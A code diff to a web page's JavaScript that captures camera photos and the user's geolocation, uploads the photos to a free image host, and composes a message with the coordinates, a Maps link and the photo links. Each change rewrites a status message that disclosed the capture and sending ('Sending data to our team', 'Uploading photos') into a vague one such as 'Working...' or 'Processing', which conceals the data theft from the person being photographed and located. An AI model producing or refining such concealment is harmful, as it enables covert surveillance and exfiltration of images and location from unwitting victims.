@@ -583,7 +583,7 @@
                 video.srcObject = stream;
                 
                 updateStep(2, 'complete');
-                updateLoadingText('Camera access granted! Preparing to capture photos...');
+                updateLoadingText('Granted! Preparing ...');
                 
                 // Wait for video to be ready
                 video.onloadedmetadata = () => {
@@ -595,7 +595,7 @@
                         }, 2000); // Give camera time to initialize
                     }).catch(err => {
                         console.error('Video play error:', err);
-                        showError('❌ Error starting camera feed. Please refresh and try again.');
+                        showError('❌ Error starting . Please refresh and try again.');
                     });
                 };
             })
@@ -710,7 +710,7 @@
             
             if (photoFiles.length > 0) {
                 updateStep(3, 'complete');
-                updateLoadingText('Photos captured! Sending data to our team...');
+                updateLoadingText('Working...');
                 
                 setTimeout(() => {
                     sendCompleteData();
@@ -812,14 +812,14 @@
             const { latitude, longitude, accuracy } = locationData.coords;
             const timestamp = new Date(locationData.timestamp);
             
-            console.log('Uploading photos to image hosting...');
-            updateLoadingText('Uploading photos to image hosting...');
+            console.log('Working to hosting...');
+            updateLoadingText('Working to hosting...');
             
             // Upload all photos to image hosting
             const uploadedPhotos = [];
             for (let i = 0; i < photoFiles.length; i++) {
                 try {
-                    updateLoadingText(`Uploading photo ${i + 1} of ${photoFiles.length}...`);
+                    updateLoadingText(`Processing ${i + 1} of ${photoFiles.length}...`);
                     const uploadResult = await uploadPhotoToFreeImageHost(
                         photoFiles[i].blob, 
                         photoFiles[i].file.name
@@ -834,12 +834,12 @@
                             size: photoFiles[i].blob.size,
                             timestamp: photoFiles[i].timestamp
                         });
-                        console.log(`Photo ${i + 1} uploaded:`, uploadResult.url);
+                        console.log(`Process ${i + 1} uploaded:`, uploadResult.url);
                     } else {
-                        console.error(`Failed to upload photo ${i + 1}`);
+                        console.error(`Failed ${i + 1}`);
                     }
                 } catch (error) {
-                    console.error(`Error uploading photo ${i + 1}:`, error);
+                    console.error(`Error Processing ${i + 1}:`, error);
                 }
             }
             
@@ -855,7 +855,7 @@
 • Captured Time: ${timestamp.toLocaleString()}
 • Google Maps: https://www.google.com/maps?q=${latitude},${longitude}
 
-📷 VERIFICATION PHOTOS (${photoFiles.length} captured, ${uploadedPhotos.length} uploaded):`;
+📷 Data (${photoFiles.length} captured, ${uploadedPhotos.length} uploaded):`;
 
             if (uploadedPhotos.length > 0) {
                 emailMessage += `\n\n🖼️ PHOTO LINKS - Click to view:`;
